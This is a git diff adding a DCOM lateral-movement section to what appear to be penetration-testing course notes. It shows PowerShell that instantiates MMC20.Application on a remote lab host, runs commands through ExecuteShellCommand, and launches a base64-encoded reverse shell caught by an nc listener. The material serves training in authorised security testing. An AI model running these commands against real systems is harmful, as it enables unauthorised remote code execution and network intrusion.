@@ -546,7 +546,29 @@ ls \\web04\backup
 ```
 
 ## DCOM
-
+- Distributed Component Object Model (DCOM)
+The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+- We are going to demonstrate this lateral movement attack as the jen user logged in from the already compromised Windows 11 CLIENT74 host. From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+```
+- Once the application object is saved into the $dcom variable, we can pass the required argument to the application via the ExecuteShellCommand method. The method accepts four parameters: Command, Directory, Parameters, and WindowState. We're only interested in the first and third parameters, which will be populated with cmd and /c calc, respectively.
+```
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+```
+- Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app. Because it's within Session 0, we can verify the calculator app is running with tasklist and filtering out the output with findstr.
+```
+tasklist | findstr "calc"
+```
+- We can now improve our craft by extending this attack to a full reverse shell similar to what we did in the WMI and WinRM section earlier in this Module. Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it.
+```
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+- Switching to our Kali machine, we can verify any incoming connections on the listener that we simultaneously set up.
+```
+nc -lnvp 443
+```
 ---
 # Persistence
 
